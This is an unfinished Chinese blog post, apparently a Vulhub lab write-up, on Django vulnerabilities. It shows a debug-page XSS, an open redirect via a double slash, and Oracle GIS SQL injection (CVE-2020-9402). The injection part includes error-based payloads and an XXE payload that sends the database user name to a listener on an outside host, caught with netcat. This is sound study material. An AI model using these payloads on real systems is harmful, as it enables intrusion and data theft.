---
layout: post
title:  "【Vulhub】Django 漏洞"
date:   2023-06-17 00:00:00 +0800
categories: 安全
tags: Vulhub 安全
comments: 1
mathjax: true
copyrights: 原创
---

本文讨论了 Vulhub 中的 Django 漏洞。包括了

- debug page XSS漏洞（CVE-2017-12794）
- 任意URL跳转漏洞（CVE-2018-14574）
- JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）
- GIS SQL 注入漏洞 (CVE-2020-9402)
- QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）
- Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）

别急，还没写完……

# debug page XSS漏洞（CVE-2017-12794）

https://vulhub.org/#/environments/django/CVE-2017-12794/

**影响范围**：Django 1.11.15 之前的 1.11.x 版本

**修复代码**：https://github.com/django/django/commit/46e2b9e059e617afe6fe56da9f132568a7e6b198

如果数据库中已经有了一条数据，django 试图再创建一条一模一样的数据，就会触发 IntegrityError。为了让开发者能够更加清楚地知道是什么重复了，django 会输出具体的提示。

其输出提示的具体实现为 https://github.com/django/django/blob/293608a2e0c7968538597200b72c9b5e9df4184a/django/views/templates/technical_500.html：

```html
{ % for frame in frames % }
  { % ifchanged frame.exc_cause % }
    { % if frame.exc_cause % }
    <li><h3>
    { % if frame.exc_cause_explicit % }
      The above exception ({ { frame.exc_cause } }) was the direct cause of the following exception:
    { % else % }
      During handling of the above exception ({ { frame.exc_cause } }), another exception occurred:
    { % endif % }
    </h3></li>
    { % endif % }
  { % endifchanged % }
```

而处理异常的函数为 https://github.com/django/django/blob/6e55e1d88a5c4453e25f0caf7ffb68973de5c0ba/django/db/utils.py：

```python
def __exit__(self, exc_type, exc_value, traceback):
    if exc_type is None:
        return
    for dj_exc_type in (
        DataError,
        OperationalError,
        IntegrityError,
        InternalError,
        ProgrammingError,
        NotSupportedError,
        DatabaseError,
        InterfaceError,
        Error,
    ):
        db_exc_type = getattr(self.wrapper.Database, dj_exc_type.__name__)
        if issubclass(exc_type, db_exc_type):
            dj_exc_value = dj_exc_type(*exc_value.args)
            dj_exc_value.__cause__ = exc_value
            if not hasattr(exc_value, '__traceback__'):
                exc_value.__traceback__ = traceback
            # Only set the 'errors_occurred' flag for errors that may make
            # the connection unusable.
            if dj_exc_type not in (DataError, IntegrityError):
                self.wrapper.errors_occurred = True
            raise dj_exc_value.with_traceback(traceback) from exc_value
```

可以看到，当抛出 IntegrityError 时，`__cause__` 会被设置为 `exc_value`，也就是对上一个异常的说明。

因此，该功能存在如下漏洞：如果重复数据包含恶意的字段名称，那么它会被直接输出。在 Vulhub 样例中，可以访问 2 次 `http://127.0.0.1:8000/create_user/?username=<script>alert(1)</script>` 来触发。其主要经过了两个步骤：

- 第一次访问时，创建名为 `<script>alert(1)</script>` 的用户
- 第二次访问时，该用户已经被创建，触发 IntegrityError。页面输出的错误信息中包含 `<script>alert(1)</script>`，成功 XSS。

修复该漏洞主要将 `frame.exc_cause` 后增加 `force_escape` 操作，防止恶意输入。

# 任意URL跳转漏洞（CVE-2018-14574）

https://vulhub.org/#/environments/django/CVE-2018-14574/

**影响范围**：Django1.11.15之前的1.11.x版本 & Django2.0.8之前的Django2.0.x版本

**修复代码**：https://github.com/django/django/commit/a656a681272f8f3734b6eb38e9a88aa0d91806f1#diff-a73a5062f47e9c4a504cccfe1674ec080ecc7f515d0d53885e6472704236efd2

Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。（由配置项中的`django.middleware.common.CommonMiddleware`、`APPEND_SLASH`来决定）。

但如果访问 http://127.0.0.1:8000//www.example.com，浏览器会认为目的地址为绝对地址，从而跳转到该地址。

复现如下。发送 HTTP 报文：

```http
GET //www.example.com HTTP/1.1
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSTE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 2
```

收到 301 跳转：

```http
HTTP/1.1 301 Moved Permanently
Date: Sat, 17 Jun 2023 09:45:57 GMT
Server: WSGIServer/0.2 CPython/3.7.17
Content-Type: text/html; charset=utf-8
Location: /www.example.com/
Content-Length: 0
```

漏洞的修复只需要判断请求中是否有双斜杠 `//`，如果有，则对其进行转义处理。

# JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）

https://vulhub.org/#/environments/django/CVE-2019-14234/

**影响范围**：Django (1.11.x) Version < 1.11.23 & Django (2.1.x) Version < 2.1.11 & Django (2.2.x) Version < 2.2.4

# GIS SQL 注入漏洞 (CVE-2020-9402)

https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402

首先要说的是这个环境超级难搭。Oracle 数据库+Django 需要 9G 的磁盘空间，而且数据库启动需要不少时间，于是 django 抽风不停重启，要等好久才能正常。

## 漏洞1

漏洞利用的是 GIS（地理信息查询系统），有漏洞的代码如下：

```python
def vuln(request):
    query = request.GET.get('q', default=0.05)
    qs = Collection.objects.annotate(
        d=Distance(
            Point(0.01, 0.01, srid=4326),
            Point(0.01, 0.01, srid=4326),
            tolerance=query,
        ),
    ).filter(d=D(m=1)).values('name')
    return HttpResponse(qs)
```

> **一些并不关心的小知识**
>
> 在 Oracle 中，tolerance（容差）是指在执行搜索操作时，用于确定匹配结果的模糊度或接受程度的设置。它用于控制查询的灵活性，以便能够返回与指定条件相似但不完全匹配的结果。tolerance 可以应用于不同的搜索操作，例如文本搜索、地理位置搜索等。它允许你指定查询条件与目标数据之间的差异范围，并确定允许的模糊匹配程度。

上述代码对应的查询语句为：

```sql
SELECT "APP_NAMEDMODEL"."NAME" FROM "APP_INTERSTATE" INNER JOIN "APP_NAMEDMODEL" ON ("APP_INTERSTATE"."NAMEDMODEL_PTR_ID" = "APP_NAMEDMODEL"."ID") WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (0.01, 0.01),4326), SDO_GEOMETRY(POINT (0.01, 0.01),4326), 0.05) =  1.0 FETCH FIRST 21 ROWS ONLY;
```

查看 https://github.com/django/django/blob/335c9c94acf263901fb023404408880245b0c4b4/django/contrib/gis/db/models/functions.py，可以看到，`as_oracle` 函数为：

```python
def as_oracle(self, compiler, connection, **extra_context):
    tol = self.extra.get('tolerance', self.tolerance)
    return self.as_sql(
        compiler, connection,
        template="%%(function)s(%%(expressions)s, %s)" % tol,
        **extra_context
    )
```

`tolerance` 从 `self.extra.get` 导入，该方法会搜索全局变量的值，如果该值不存在，则直接设置为 0.05，并且将其直接传入到新的变量中。之后则不对 tol 进行任何处理直接拼接到 template 字符串中并且传入 `as_sql` 方法。那么官方对于 `as_sql` 的文档是，此方法需要一个SQLCompiler对象，位于`django/db/models/sql/compiler.py`文件中。而我们只需要知道在该对象中有一个`compile()`方法，该方法可以返回一个包含 SQL 字符串的元祖，而 SQLComiler 对象中的 query 变量则是存储直接进行 SQL 查询语句的 SQL 命令。从而两个 Point 分别进入`compile`方法中进行拼接。

我们可以用此方法报错注入，找到数据库版本号：`?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null OR (1%2B1`，那么查询就变成了：

```sql
SELECT "APP_NAMEDMODEL"."NAME" FROM "APP_INTERSTATE" INNER JOIN "APP_NAMEDMODEL" ON ("APP_INTERSTATE"."NAMEDMODEL_PTR_ID" = "APP_NAMEDMODEL"."ID") WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (0.01, 0.01),4326), SDO_GEOMETRY(POINT (0.01, 0.01),4326), 20) = 1 OR (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null OR (1+1) = 1.0 FETCH FIRST 21 ROWS ONLY;
```

该注入的修复也很简单，直接判断 `tolerance` 是否为数字即可：

```python
tolerance = Value(self._handle_param(
    self.extra.get('tolerance', self.tolerance),
    'tolerance',
    NUMERIC_TYPES,
))
```

## 漏洞2

另一段有漏洞的函数为：

```python
def vuln2(request):
    query = request.GET.get('q', default=0.05)
    qs = Collection2.objects.aggregate(
            Union('point', tolerance=query),
    ).values()

    return HttpResponse(qs)
```

这边的 SQL 查询语句为：

```sql
SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE("APP_CITY"."POINT", 0.05))) AS "POINT__UNION" FROM "APP_CITY";
```

查看 https://github.com/django/django/blob/335c9c94acf263901fb023404408880245b0c4b4/django/contrib/gis/db/models/aggregates.py，可以看到有：

```python
def as_oracle(self, compiler, connection, **extra_context):
    tolerance = self.extra.get('tolerance') or getattr(self, 'tolerance', 0.05)
    template = None if self.is_extent else '%(function)s(SDOAGGRTYPE(%(expressions)s,%(tolerance)s))'
    return self.as_sql(compiler, connection, template=template, tolerance=tolerance, **extra_context)
```

这里，`tolerance` 同样没有检查就用于 SQL 查询。

同样的，我们可以使用报错注入：`?q=20))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --`，那么查询就变成了：

```sql
SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE("APP_CITY"."POINT", 20))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --))) AS "POINT__UNION" FROM "APP_CITY";
```

由此得到了数据库用户名。

考虑到 Oracle 的版本，漏洞 1（漏洞 2 类似）还可以利用 Oracle XXE 漏洞（CVE-2014-6577） 注入构造的恶意 xml：`?q=20) = 1 OR (select extractvalue(xmltype('%3C%3Fxml version%3D%221.0%22 encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE root %5B %3C!ENTITY %25%25%25%25 remote SYSTEM %22http%3A%2F%2Fhost.docker.internal%3A9000%2F'%7C%7C(SELECT  utl_inaddr.get_host_name() from dual)%7C%7C'%22%3E %25%25%25%25remote%3B%5D%3E')%2C'%2Fl') from dual) is not null OR (1%2B1`。

在 shell 中监听得到：

```shell
$ nc -l 9000
GET /SYSTEM HTTP/1.0
Host: host.docker.internal
Content-Type: text/plain; charset=utf-8
```

可以看到，返回了数据库用户名。

# QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）

https://vulhub.org/#/environments/django/CVE-2021-35042/

# Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）

https://vulhub.org/#/environments/django/CVE-2022-34265/

# 参考

- https://www.cnblogs.com/f-carey/p/15889106.html#tid-dTaJ5R
- https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html
- https://xz.aliyun.com/t/7403
